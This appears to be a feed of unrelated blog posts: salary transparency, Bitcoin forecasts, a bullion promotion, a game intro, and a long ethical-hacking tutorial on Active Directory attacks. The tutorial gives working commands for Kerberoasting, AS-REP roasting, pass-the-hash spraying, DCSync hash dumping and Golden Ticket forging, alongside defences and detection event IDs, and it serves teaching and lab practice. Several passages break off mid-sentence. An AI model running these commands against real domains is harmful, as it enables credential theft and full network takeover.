![salry1.png](https://files.peakd.com/file/peakd-hive/bhattg/23tGPLTctei4Qqi5TNLr85zDTLPjVkRoLH3ARqWv3iUGmRZ5GKstf7QwA5mgUfsDTw3g7.png)


[ImgSrc](ChatGpt.com)



But if everyone's salary is revealed then people start comparing. Many times it happens that if you know the salary of your seniors or your juniors know your salary and you are not able to do any work and still they do it better than you, then they start comparing and think that why is he being given such a high salary when we can do it better than him. See, if there is to be complete transparency then whatever salary distribution is there, it should be done through Blockchain because through Dakshin you can easily track who gets how much salary and many other things can also be tracked. Because here you see transparency, if you talk about normal centralized banks then no one can see anyone else's account and everyone has their own limitations but if you are employed by a bank then you can easily see how much money each user has in it and from where the transaction is coming and where it is going, you can check all this.



But this permission is not given to everyone, so in such a situation if the general public wants to see the salary of others, wants to see their source of income, then this can be done easily particularly through a blockchain, you can see through high blockchain itself how you can see other's wallet and can also track other's transactions which makes it easier for you to identify scammers, this will be a good way through which you will know where people's income is coming from and you may also be able to generate some other source of income for yourself. See, the thing is that every rich person does not want everyone to become rich. If everyone becomes rich then what will be their value? If everyone has money then maybe our people will go after something else and the value of money will not remain the same.



![salry2.png](https://files.peakd.com/file/peakd-hive/bhattg/23uQNa3DKRWYJff822SLpG2ZBefRfXPmucqLqb4RZE7RzmY5ziD2AdUEZv7MmWSfPd3WD.png)


[ImgSrc](ChatGpt.com)


Everything has its advantages and disadvantages too, so I feel that you should not disclose your salary because it is not a good option, if it is implemented by the government then no one can do anything, but personally I said that if you have an opinion then you should refuse it because many times it happens that some people will approach you after checking your balance and if you do not give it to them then they will still tell you everything nicely and go away. The reality is that many people are connected to each other and in such a situation, if they come to know what your bank balance is and where your income comes from, then they may not contact you or try to get closer to you, a lot can happen.


So it is very important for us to have secrecy and I think it should be the same in the case of salary or it is better if you do not disclose it, in such a situation you should have some privacy, some people are helpless but some people may be fine with this because they would like to know how much their salary is and some people do not want to disclose it and they want to live a normal life peacefully.

links.body:
As geopolitical tensions in the Middle East simmer, with ongoing negotiations and ceasefires between Iran, Israel, and the United States, markets are closely watching for signs of a lasting peace agreement. Bitcoin, currently trading around $77,000, has shown resilience amid volatility driven by the conflict. A comprehensive agreement ending hostilities could remove a major risk premium and unlock significant upside for the world's leading cryptocurrency.

### Geopolitical Risk and Bitcoin's Behavior

Conflicts in the Middle East have historically created short-term uncertainty for risk assets. During escalations involving Iran, Bitcoin has sometimes faced pressure as investors de-risk, treating it more like a growth asset correlated with equities than a pure safe haven like gold. However, resolutions or de-escalations often spark relief rallies.

Recent examples from the current cycle illustrate this dynamic. Bitcoin has rallied on de-escalation signals, such as responses to peace proposals or ceasefire extensions, climbing toward or above $80,000 in some instances as oil prices eased and risk appetite returned. A full agreement—potentially involving stabilized oil flows through the Strait of Hormuz, reduced sanctions pressure, and broader regional stability—would likely amplify this effect by boosting global economic confidence.

### Potential Price Targets: Bullish Scenarios

Analysts and market observers point to several catalysts that could propel Bitcoin substantially higher in a post-agreement environment:

- **Risk-On Sentiment and Capital Inflows**: Reduced geopolitical uncertainty typically encourages institutional buying. With Bitcoin already benefiting from pro-crypto U.S. policy signals and ETF momentum, a peace deal could accelerate inflows from traditional finance. Some forecasts in bullish macro environments have eyed $100,000 as a near-term psychological target, with extensions toward $120,000–$150,000 if combined with favorable monetary policy.

- **Lower Oil Volatility and Inflation Outlook**: The conflict has influenced energy markets, with disruptions raising concerns about inflation. A deal stabilizing oil supplies (potentially lowering Brent crude from elevated levels) could ease inflationary pressures, supporting a softer Federal Reserve stance or at least removing tail risks—positive for growth assets like Bitcoin.

- **Macro Tailwinds**: Bitcoin's long-term correlation with liquidity and risk appetite remains strong. In a de-escalated world, renewed focus on U.S. fiscal developments, potential rate adjustments, and Bitcoin's growing role as a strategic asset (including corporate and sovereign adoption) could drive new highs. Optimistic voices have even discussed much higher targets in extended bull cycles, though $100,000+ appears the most consensus near-term level on positive resolution.

Conservative estimates suggest Bitcoin could test $90,000–$110,000 relatively quickly on confirmed peace progress, assuming no major offsetting negatives. More aggressive scenarios, factoring in continued adoption and halving-cycle momentum, point even higher if the agreement fosters a broader \

global mood.

### Risks and Caveats

Not all paths lead straight up. Markets could \

if a deal is already partially priced in, or if implementation drags with lingering disputes (e.g., over nuclear issues or regional proxies). Bitcoin remains volatile and sensitive to broader macro factors like U.S. dollar strength or equity market moves.

Moreover, while Bitcoin has at times acted as a hedge during uncertainty, it often behaves as a high-beta asset in the short term. Sustained peace would likely benefit it more through indirect channels (economic growth, liquidity) than as a direct safe-haven play.

### Conclusion: A Catalyst for New Highs?

A durable agreement ending the Iran-related conflict would represent one of the clearest positive geopolitical tailwinds for Bitcoin in recent memory. By clearing uncertainty, lowering energy volatility, and reinforcing a pro-risk environment, it could pave the way for BTC to not only reclaim recent highs but push meaningfully toward or beyond $100,000.

Investors should monitor developments closely—diplomatic breakthroughs, oil price reactions, and on-chain metrics—as the market prices in reduced global risk. In crypto, as in geopolitics, peace often proves profitable. While no outcome is guaranteed, the potential upside for Bitcoin in a stabilized Middle East looks compelling.

links.title: The Peace of Staying Limited 💭
links.body:
Sometimes a person spends their whole life searching for peace in the outside world…
in people, freedom, attention, and endless desires. But life quietly teaches something different with time: true peace is not always found in having more — sometimes it is found in needing less.
Being limited feels uncomfortable at first.
No one likes restrictions, distance, or silence. But when life pushes a person through disappointment, betrayal, exhaustion, or loneliness, they slowly begin to understand something deeper.
Not every open door is good for you.
Not every connection deserves your energy.
And not every freedom brings peace.
There comes a moment when a person realizes that a smaller circle can protect the heart better than a crowded room ever could. Fewer expectations bring less pain. Less noise brings better sleep. Less explaining brings more dignity.
The strange thing is…
most people only understand the value of limitations after life forces them into them. When the world becomes too heavy, simplicity starts feeling like safety instead of weakness.
Sometimes being limited is not a prison.
Sometimes it is protection.

# Learn Ethical Hacking (#33) - Active Directory Attacks - The Crown Jewels

![leh-banner.jpg](https://images.hive.blog/DQmc2LpoeHUPesc4Dy8haRKLJgfuDY6UBKdc3sED8Dz3JH9/leh-banner.jpg)

### What will I learn

- **What Active Directory is** and why it is the single most valuable target in enterprise networks;
- **AD enumeration** -- mapping users, groups, computers, trusts, and GPOs with BloodHound and PowerView;
- **Kerberoasting** -- extracting service account password hashes without admin privileges;
- **AS-REP Roasting** -- attacking accounts that do not require pre-authentication;
- **Pass-the-Hash and Pass-the-Ticket** -- moving laterally without knowing plaintext passwords;
- **DCSync** -- extracting all domain password hashes by impersonating a domain controller;
- **Golden and Silver Tickets** -- forging Kerberos tickets for unlimited persistence;
- Defense: tiered administration, LAPS, Protected Users group, Credential Guard.

### Requirements

- A working modern computer running macOS, Windows or Ubuntu;
- Your hacking lab from Episode 2 (Windows AD environment);
- Understanding of Windows privilege escalation from Episode 32;
- The ambition to learn ethical hacking and security research.

- Intermediate/Advanced

# Learn Ethical Hacking (#33) - Active Directory Attacks - The Crown Jewels

You have SYSTEM on a Windows box. Congratulations -- you own one computer. In an enterprise with 5,000 workstations and 200 servers, that is 0.02% of the network. One machine. In a sea of machines.

This is where **Active Directory** changes the game entirely.

Episodes 31 and 32 were about going from a low-privilege shell to root/SYSTEM on a single machine. That was the vertical climb. Now we go horizontal and vertical simultaneously -- because compromising Active Directory means compromising EVERYTHING. Every user account. Every password hash. Every machine. Every service. Every Group Policy. The entire organization's identity infrastructure, in one shot.

Active Directory (AD) is the centralized identity and access management system used by 95%+ of enterprise networks worldwide. It handles authentication (who are you?), authorization (what can you do?), and policy enforcement (what rules apply?) for every Windows domain-joined machine in the organization. When an attacker compromises Active Directory, the engagement is over. You control the domain. You control the organization. You ARE the organization's IT department, except the real IT department doesn't know that yet.

In every pentest I've seen that targets an enterprise Windows environment, the kill chain follows the same pattern: initial access -> local privesc (episodes 31-32) -> AD enumeration -> domain escalation -> **Domain Admin**. The techniques in this episode are the bridge between \

This is where pentesting gets truly interesting ;-)

### AD Fundamentals for Attackers

Before we attack it, you need to understand what Active Directory actually IS. Not from an admin's perspective (Microsoft has 4,000 pages of documentation for that) but from an attacker's perspective -- what matters, what's exploitable, and what leads to domain compromise.

**Domain** -- a logical grouping of objects (users, computers, groups, policies) that share a common directory database and security boundary. Most organizations have one domain. Large organizations might have multiple domains organized into a forest.

**Domain Controller (DC)** -- the server that hosts the AD database (`ntds.dit`) and handles all authentication. This is the crown jewel. Compromising a Domain Controller means you have every password hash for every account in the domain. On most networks there are 2-3 DCs for redundancy, and you only need to compromise ONE.

**Forest** -- one or more domains that share a common schema and trust relationships. If you compromise one domain in a forest, trust relationships can let you move to other domains.

**Kerberos** -- the authentication protocol that AD uses. Understanding Kerberos is not optional for AD attacks -- every major technique in this episode (Kerberoasting, AS-REP roasting, Golden Tickets, Silver Tickets, Pass-the-Ticket) exploits some aspect of how Kerberos works. We covered cryptography fundamentals in episode 9 -- Kerberos builds on symmetric key encryption, ticket-based authentication, and trusted third parties (the KDC on the Domain Controller).

**LDAP** -- the protocol used to query the AD database. LDAP is how you enumerate users, groups, computers, group memberships, and organizational units. Any authenticated domain user can query LDAP.

**Group Policy Objects (GPOs)** -- policies pushed from the Domain Controller to domain-joined machines. GPOs control everything from password policies to software installation to security settings. Misconfigured GPOs are a common escalation path.

Here is the critical insight that makes AD attacks so powerful: **any authenticated domain user can query Active Directory**. You do not need admin privileges. You do not need special permissions. A standard user account -- the one the help desk created for the intern last Monday -- is enough to enumerate every user, every group, every computer, every trust relationship, and every Group Policy in the entire domain. The information asymmetry is massive: defenders think standard users \

but standard users can see EVERYTHING about the directory structure. They just can't modify it.

### AD Enumeration with BloodHound

**BloodHound** is the single most important Active Directory attack tool. Full stop. If you learn one AD tool from this episode, make it BloodHound.

BloodHound maps the relationships between users, groups, computers, sessions, and permissions. Then it uses graph theory to find attack paths -- chains of relationships that lead from your current position to Domain Admin. It finds paths that no human could manually discover: user A is admin on machine B where user C has an active session, and user C is a member of group D which has GenericWrite over user E who is a Domain Admin. That's a four-hop chain through unrelated objects. BloodHound finds it in seconds.

sudo neo4j start
bloodhound &

# On the compromised machine: run SharpHound collector
# https://github.com/BloodHoundAD/SharpHound
.\SharpHound.exe --CollectionMethods All --Domain corp.local

# SharpHound generates a ZIP file with all the relationship data
# Transfer it to your attack machine
# Import into BloodHound via the Upload button
```

Once imported, ask BloodHound the questions that matter:

```
# Built-in queries:
\

-- is gold. If a Domain Admin is logged into machine X, and you can get admin on machine X (through any local privesc technique from episodes 31-32), you can steal their Kerberos ticket or NTLM hash with mimikatz. Game over. From standard user to Domain Admin through one intermediate machine. BloodHound shows you exactly which machine to target.

### PowerView -- Manual AD Enumeration

When you need surgical precision instead of BloodHound's broad sweep, **PowerView** gives you direct control over AD queries:

```powershell
# Import PowerView (part of PowerSploit)
Import-Module .\PowerView.ps1

# Enumerate all domain users with descriptions
# (descriptions sometimes contain passwords -- yes, really)
Get-DomainUser | Select-Object samaccountname, description, memberof

# Find Domain Admins
Get-DomainGroupMember -Identity \

# Find computers where current user has local admin access
Find-LocalAdminAccess

# Find where Domain Admins are logged in RIGHT NOW
Find-DomainUserLocation -UserGroupIdentity \

# Enumerate Group Policy Objects
Get-DomainGPO | Select-Object displayname, gpcfilesyspath

# Find accessible network shares
Find-DomainShare -CheckShareAccess

# Enumerate trust relationships between domains
Get-DomainTrust

# Find service accounts with SPNs (Kerberoasting targets)
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
```

The `description` field is one of those things that makes you want to laugh and cry at the same time. I have personally found domain admin passwords in user description fields. \

sitting right there in a field that ANY authenticated user can read via LDAP. The description field is not hidden. It is not encrypted. It is not access-controlled. It is readable by literally everyone on the domain. And yet administrators use it as a notepad for credentials because... well, I honestly don't know why. But they do. Regularly.

`Find-DomainUserLocation` is the other command I want to highlight. It tells you exactly which machines have Domain Admin sessions active RIGHT NOW. Compromise that machine, steal the credentials from memory (mimikatz `sekurlsa::logonpasswords` from episode 32), and you have Domain Admin credentials. This is the single most common real-world AD attack path: find where the admin is logged in, compromise that machine, steal the credentials.

### Kerberoasting

**Kerberoasting** exploits a fundamental property of how Kerberos handles service tickets. Here's the short version: any authenticated domain user can request a service ticket (TGS) for any service account that has a Service Principal Name (SPN) registered. That ticket is encrypted with the service account's NTLM password hash. You request the ticket, extract it, and crack it offline. The Domain Controller happily hands you the ticket -- this is how Kerberos is DESIGNED to work. It trusts that the encryption will protect the password. But if the password is weak, you crack it and now you have plaintext credentials for a service account.

```powershell
# Using Rubeus (https://github.com/GhostPack/Rubeus)
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Or using GetUserSPNs.py from Impacket (from Linux attack box)
GetUserSPNs.py corp.local/jsmith:Password123 -request -outputfile hashes.txt

# Crack with hashcat (mode 13100 for Kerberos TGS-REP)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

Why this works in practice: service accounts are created once and forgotten. The MSSQL service account was set up in 2016 with the password `SqlServer1!` and nobody has changed it since. The backup service account has been running with `Backup2019` for six years. Nobody rotates service account passwords because nobody wants to deal with the downtime of restarting the service with a new password. The service \

and nobody touches it.\n\nThe really devastating part: service accounts are frequently added to privileged groups because the admin who set them up couldn't figure out the correct minimum permissions. \

This is a depressingly common misconfiguration. So you Kerberoast, crack a weak password, and discover that the service account you compromised is a member of Domain Admins. Standard user to Domain Admin. No exploits. No vulnerabilities. Just asking Kerberos for a ticket (which it is designed to give you) and cracking a weak password (which should never have been set in the first place).

The attack requires ZERO elevated privileges. Any domain user. That's it. This is by design -- Kerberos was not built to protect service account passwords from offline cracking. It was designed in the 1980s at MIT when password cracking was not a realistic threat. The protocol has not fundamentally changed since then.

### AS-REP Roasting

**AS-REP Roasting** targets accounts that have the **\

** flag set. Normally when you request a TGT (Ticket Granting Ticket) from the KDC, you must prove you know the password first -- this is called preauthentication. It prevents offline cracking because the KDC won't give you anything unless you authenticate first.\n\nBut if preauthentication is disabled for an account, ANYONE can request an AS-REP for that account. Not \

-- literally anyone. No credentials required. The KDC returns an AS-REP encrypted with the account's password hash, and you crack it offline.

```bash
# From Linux with Impacket -- no credentials needed!
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -outputfile asrep.txt

# From Windows with Rubeus
.\Rubeus.exe asreproast /outfile:asrep.txt

# Crack with hashcat (mode 18200 for AS-REP)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

\

is sometimes enabled for legacy applications that cannot handle the preauthentication handshake. Old Linux systems using certain Kerberos libraries. Legacy Java applications. Software from the early 2000s that predates modern Kerberos implementations. The admin disables preauth because \
and never re-enables it when the application is updated or decommissioned.\n\nSound familiar? It is the same pattern from episode 6 (AI slop epidemic) and every episode since: a quick fix that \

without understanding the security implication. Disabling preauthentication removes the one safeguard that prevents offline password cracking for that account ;-)

### Pass-the-Hash and Pass-the-Ticket

Once you have a hash (from mimikatz, from SAM extraction, from Kerberoasting, from DCSync), you do not necessarily need to crack it. Windows authentication accepts the hash directly in many scenarios:

```bash
# Pass-the-Hash with Impacket's psexec
psexec.py -hashes :NTLM_HASH corp.local/administrator@dc01.corp.local

# Pass-the-Hash with evil-winrm
evil-winrm -i dc01.corp.local -u administrator -H NTLM_HASH

# Pass-the-Hash with crackmapexec (spray across multiple targets)
crackmapexec smb 10.10.10.0/24 -u administrator -H NTLM_HASH
```

**Pass-the-Hash** works because NTLM authentication uses the hash as the credential, not the plaintext password. The protocol sends a challenge, the client responds with HMAC(hash, challenge), and the server verifies it. At no point does the plaintext password need to exist. The hash IS the password as far as NTLM is concerned. This is a fundamental design decision in Windows authentication that has been exploited for over 20 years -- and it's not going away because NTLM is still required for backwards compatibility with legacy systems.

**Pass-the-Ticket** is the Kerberos equivalent. Instead of passing a hash, you steal a Kerberos TGT (Ticket Granting Ticket) from memory and import it into your own session:

```powershell
# Steal tickets from memory with mimikatz (requires admin/SYSTEM)
mimikatz# sekurlsa::tickets /export
# Creates .kirbi files for each ticket in memory

# Import a stolen ticket with Rubeus
.\Rubeus.exe ptt /ticket:admin_tgt.kirbi
# Your session now uses the imported ticket

# Or from Linux with Impacket
export KRB5CCNAME=admin.ccache
psexec.py -k -no-pass corp.local/administrator@dc01.corp.local
```

Having said that, the distinction matters: PtH uses NTLM authentication (older, being phased out, but still widely supported). PtT uses Kerberos authentication (newer, preferred, harder to detect). In environments that have disabled NTLM (which is rare but increasing), only PtT works. In mixed environments, both work. The practical effect is the same -- you authenticate as someone else without knowing their password.

The `crackmapexec` command in the PtH example above is worth noting. It lets you spray a hash across an entire subnet. One compromised local admin hash, sprayed across 254 machines -- and on every machine that shares the same local admin password, you get access. This is exactly why LAPS (Local Admin Password Solution, mentioned in episode 32) matters so much. Without LAPS, one local admin hash = access to every machine.

### DCSync -- Becoming the Domain Controller

**DCSync** is the endgame attack. If you have an account with `Replicating Directory Changes` and `Replicating Directory Changes All` privileges -- which Domain Admins have by default -- you can pretend to be a Domain Controller and request the password hash for ANY account in the domain.

This is not a vulnerability. This is how Active Directory replication works. When a company has multiple Domain Controllers, they need to synchronize their databases. One DC asks the other \

and the other DC responds with password hashes, group membership changes, GPO updates, everything. DCSync abuses this mechanism: your attack machine pretends to be a Domain Controller requesting replication.

```bash
# From Linux with Impacket -- dump everything
secretsdump.py corp.local/admin:Password@dc01.corp.local

# From Windows with mimikatz -- dump specific account
mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt

# Dump ALL accounts
mimikatz# lsadump::dcsync /domain:corp.local /all /csv
```

The `secretsdump.py` output is simultaneously beautiful and terrifying. Every account in the domain. Every NTLM hash. Service accounts, admin accounts, user accounts, machine accounts. Everything. In one command. I remember the first time I ran a succesful DCSync on a pentest -- the output just kept scrolling. Hundreds of accounts. Every password hash in the organization. The client had 2,300 employees and I had every single one of their password hashes in a text file.

The most important hash in that output is **krbtgt** -- the Kerberos Ticket Granting Ticket account. This account is created automatically when Active Directory is installed and is used to encrypt all TGTs in the domain. With the krbtgt hash, you can forge Golden Tickets. We'll get to that next.

### Golden and Silver Tickets

A **Golden Ticket** is a forged Kerberos TGT (Ticket Granting Ticket). Because you have the krbtgt hash from DCSync, you can create a TGT for any user -- including users that don't exist -- with any group memberships you want. The TGT is valid because it's encrypted with the krbtgt hash, and the Domain Controller has no way to tell it wasn't generated by the KDC.

```powershell
# Create a Golden Ticket with mimikatz
mimikatz# kerberos::golden /user:fakeadmin /domain:corp.local \
    /sid:S-1-5-21-1234567890-1234567890-1234567890 \
    /krbtgt:KRBTGT_NTLM_HASH /ptt

# /user:fakeadmin -- this user does NOT need to exist in AD
# /sid:S-1-5-21-... -- the domain SID (from whoami /user)
# /krbtgt:HASH -- the krbtgt NTLM hash from DCSync
# /ptt -- pass the ticket directly into your session

# Now access the Domain Controller
dir \\dc01.corp.local\c$
# Access granted. You are \

with Domain Admin rights.
```

The terrifying part about Golden Tickets: they survive password resets. If the defender discovers you and resets every user password in the domain, your Golden Ticket still works. Because the Golden Ticket is encrypted with the **krbtgt** hash, not any user's hash. The only way to invalidate Golden Tickets is to reset the krbtgt password. And here's the kicker -- AD keeps the PREVIOUS krbtgt hash for backwards compatibility (because TGTs issued with the old hash need to keep working). So you must reset the krbtgt password TWICE to invalidate all Golden Tickets. Once to rotate, wait for all legitimate tickets to expire (default TGT lifetime is 10 hours, max renewable lifetime is 7 days), then reset AGAIN to eliminate the previous-hash window.

I've seen organizations that were compromised, ran full incident response, reset every password, rebuilt workstations, patched everything -- and the attacker walked back in with a Golden Ticket the next day. The IR team didn't reset the krbtgt password. The Golden Ticket was still valid. That's the kind of persistence this gives you.

A **Silver Ticket** is a forged service ticket (TGS) instead of a TGT. You use a service account's NTLM hash (from Kerberoasting or DCSync) to forge a ticket for that specific service. Less powerful than a Golden Ticket (only grants access to one service, not the entire domain) but significantly harder to detect because Silver Tickets never touch the Domain Controller -- the forged ticket goes directly to the target service.

```powershell
# Silver Ticket for CIFS (file shares) on the DC
mimikatz# kerberos::golden /user:fakeuser /domain:corp.local \
    /sid:S-1-5-21-... /target:dc01.corp.local \
    /service:cifs /rc4:SERVICE_ACCOUNT_HASH /ptt

# Now you can access file shares on dc01 as fakeuser
dir \\dc01.corp.local\c$
```

Silver Tickets are used for targeted access when you want to stay quiet. Golden Tickets trigger events on the DC (because the TGT gets presented to the KDC). Silver Tickets bypass the DC entirely. The tradeoff is scope vs stealth: Golden = total domain access but more detectable. Silver = single service access but nearly invisible.

### Defense: Protecting Active Directory

The attack techniques above exploit a combination of protocol design decisions (Kerberos), misconfigurations (weak service account passwords, preauth disabled), and insufficient monitoring. Defense requires addressing all three:

```powershell
# 1. Implement tiered administration model
# Tier 0: Domain Controllers and AD management ONLY
# Tier 1: Servers and applications
# Tier 2: Workstations and end-user devices
# NEVER log into a Tier 2 machine with a Tier 0 account
# This breaks the \

chain

# 2. Protected Users group -- prevents credential caching
Add-ADGroupMember -Identity \

# Members cannot: use NTLM auth, use DES/RC4 in Kerberos preauth,
# be delegated, have TGTs longer than 4 hours, cache credentials

# 3. LAPS -- unique local admin passwords per machine
# Prevents PtH lateral movement via shared local admin passwords

# 4. Reset krbtgt password TWICE (kills Golden Tickets)
# First reset: wait for TGT lifetime + renewal window to expire
# Second reset: eliminates the previous-hash compatibility window
# Tool: https://github.com/microsoft/New-KrbtgtKeys.ps1

# 5. Disable preauth-not-required flag on all accounts
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} |
    Set-ADAccountControl -DoesNotRequirePreAuth $false

# 6. Use Group Managed Service Accounts (gMSA)
# Automatically rotated 120-character passwords
# Immune to Kerberoasting (password is uncrackable)
New-ADServiceAccount -Name \

# 7. Monitor for AD attacks via Event IDs
# 4769 -- TGS requests (high volume from one source = Kerberoasting)
# 4768 -- TGT requests (preauth failure = AS-REP roasting attempt)
# 4662 -- Directory service access (DCSync detection)
# 4624 -- Logon events with unusual ticket lifetimes (Golden Ticket)

# 8. Enable Credential Guard (Windows 10 Enterprise / Server 2016+)
# Prevents mimikatz from reading credentials from LSASS memory
```

The **tiered administration model** is the most important defense on this list. The reason the \

attack works is because Domain Admins log into workstations and member servers. If they only ever logged into Domain Controllers (Tier 0) and dedicated admin workstations, their credentials would never be present in memory on a machine an attacker could reach from a standard user compromise. Tiered admin doesn't require any new software. It's a policy change. And it breaks the most common AD attack path.\n\n**Group Managed Service Accounts** (gMSAs) are the other game-changer. They automatically rotate their passwords every 30 days (configurable) with 120-character randomly generated passwords. You cannot Kerberoast a gMSA because the password is effectively uncrackable. The tech has been available since Windows Server 2012 and it STILL isn't widely adopted because.. well, it requires effort to set up and the current service accounts \

That phrase keeps coming back, doesn't it.

### The AI Slop Connection

Active Directory configuration is probably the most complex area in enterprise IT, and AI assistants are spectacularly bad at it. Common AI-generated AD misconfigurations I've seen recommended:

- Adding service accounts to Domain Admins \
for legacy apps\n- Setting static weak passwords on service accounts and never documenting rotation procedures\n- Recommending that Domain Admin accounts be used for daily work \
\n- Suggesting `net localgroup administrators DOMAIN\\user /add` as the fix for every permission error\n- Disabling Protected Users group restrictions because \

\n\nThe complexity of AD means administrators increasingly ask AI for help configuring it. The AI generates configuraitons that work but are catastrophically insecure. A service account in Domain Admins with a weak password and disabled pre-authentication is a three-step path to total domain compromise: AS-REP roast or Kerberoast, crack the password, DCSync. All from an unprivileged domain user. The AI optimised for \

and created a domain compromise waiting to happen. Episode 6 keeps being relevant.

### The Bigger Picture

With this episode, the attack progression of this series is now clear. Episodes 1-28 got you access through web applications. Episodes 29-30 gave you network-level attacks. Episodes 31-32 escalated you from low-privilege to root/SYSTEM on individual machines. And now episode 33 takes you from a single compromised machine to owning the entire domain.

This is how real breaches work. Not \

but a methodical chain: phish one user (episode 8), use their VPN credentials to access the network (episode 29), exploit a web application for initial access (episodes 12-20), escalate to SYSTEM (episodes 31-32), enumerate Active Directory (this episode), find a Kerberoastable service account in Domain Admins, crack it, DCSync, Golden Ticket, game over. Each step builds on the previous one. Each step uses techniques we've covered.

The next episodes will build on what we've covered here -- moving through networks once you have domain access, exploiting trust relationships between domains, and taking the same principles into cloud environments where Active Directory has evolved into Azure AD (now Entra ID) and the attack surface has expanded into entirely new territory.

### Exercises

**Exercise 1:** Build a minimal AD lab: one Windows Server 2019/2022 as DC, two Windows 10 workstations joined to the domain. Create: a Domain Admin account, a service account with an SPN and weak password (for Kerberoasting), and a user with \

enabled (for AS-REP roasting). From a standard domain user on a workstation, perform both Kerberoasting and AS-REP roasting. Crack the hashes and document the full path from standard user to Domain Admin.\n\n**Exercise 2:** Run **BloodHound** against your lab domain. Import the SharpHound data and answer: (a) what is the shortest path from your user to Domain Admin, (b) how many users have local admin on any machine, (c) are there any \

paths (user A is admin on machine B where user C is logged in, and user C is Domain Admin). Screenshot the BloodHound graph for each finding.

**Exercise 3:** Perform a **DCSync** attack in your lab. Starting from a Domain Admin account, use secretsdump.py to extract the krbtgt hash. Then forge a **Golden Ticket** for a non-existent user with mimikatz. Verify: (a) you can access the DC with this forged ticket, (b) the forged user does not appear in AD when queried, (c) resetting the krbtgt password once does NOT invalidate the ticket, but resetting it twice does. Document the full attack chain and explain why two resets are needed.

### Bedankt en tot de volgende keer!

links.title: One Reason Why Investors Are Drawn To Real-World Assets
links.body:
**One Reason Why Investors Are Drawn To Real-World Assets**  
**Real-World Assets**  
Because tokenisation allows fractional ownership, investors are flocking to Real-World Assets (RWAs), including real estate, government bonds, and commodities on the blockchain.  
**Searching for Stability**  
When there is war, inflation, economic uncertainty, or rising interest rates, buyers react in different ways. Traders don't like to put their money into new investments when they don't see a clear picture. In contrast to financial things, real goods have value and are in demand.  
Buyers look at the live gold price, [gold price per ounce](https://aubullion.com/gold-price-chart) and silver coin price to gain a sense of the market.  
**Precious metals (Gold and Silver)**  
Gold has always been a good way to protect yourself from inflation and changes in the value of your currency. More people now own real gold because of rising government debt and unrest around the world in recent years. When the stock market is unstable, buyers put their money in gold bars to protect it. Reliable gold refiners with high purity standards, such as Pamp Suisse, Valcambi, and Perth Mint, are known all over the world. Smaller gram bars are very popular because they give investors a lot of choices for how to invest in valuable metals.  
· The interesting thing about silver is that it can be used as money and in factories. Silver is being used more and more in industry around the world because of rising demand from green energy, gadgets, and technology.  
· As a result, investors are buying [1 ounce silver coins](https://aubullion.ca/product-category/silver/silver-coins/1-oz-silver-coins/), 5 oz silver bars, [10 oz silver bars](https://aubullion.ca/product-category/silver/silver-bars/10-oz-silver-bar/), and [100 oz silver bars](https://aubullion.ca/product-category/silver/silver-bars/100-oz-silver-bar/) for long-term diversification.  
· Monster box collections of bulk silver are also popular with investors who need huge physical holdings.  
The British Royal Mint, [Germania Mint](https://aubullion.com/product-category/germania-mint), Golden State Mint, [New Zealand Mint](https://aubullion.com/product-category/new-zealand-mint) and Scottsdale Mint are all producing investment-grade bullion to meet the growing global demand.  
Investing in industrial metals

· Industrial metals that are linked to new technologies are getting more and more attention from investors.  
· The palladium price and the palladium spot price are very important to people because palladium is still used to make cars and clear the air.  
· Palladium prices have been going up and down a lot lately because there isn't enough of it, and there is political unrest all over the world.  
· People who buy and sell things are still keeping an eye on how the price of gold changes because shortages can have a big impact on production.  
Investors of all kinds may be able to avoid having to put up large amounts of capital by breaking up valuable assets that are hard to sell into smaller, cheaper digital pieces. Without hedge fund money, regular people and businesses can buy tokenised U.S. Treasuries, real gold, and commercial real estate.

Hello, there! **@saydie** here, playing **Splinterlands** everyday!

>

It's been a few seasons now since Splinterland's weekly maintenance has been moved to Wednesday, and yet, I am still not used to this new schedule, sometimes forgetting that I still have some tournaments and brawls that I haven't submitted my teams yet, or play enough battles so as not to get my energy bar full. Just a minor stuff and is more than a me problem than a real issue.

Anyway, the reason I talk about maintenance is that with yesterday's maintenance, a brand new daily rewards system was added to the Frontier League, and that will be the topic of today's post.

![CA.png](https://files.peakd.com/file/peakd-hive/saydie/23tvY7mZ5F1UqsiqG2X3RRGzAX3ozTT6Hq4tcztUxyzehmwovZ6ty8JR6rmEoqVCkYBQp.png)
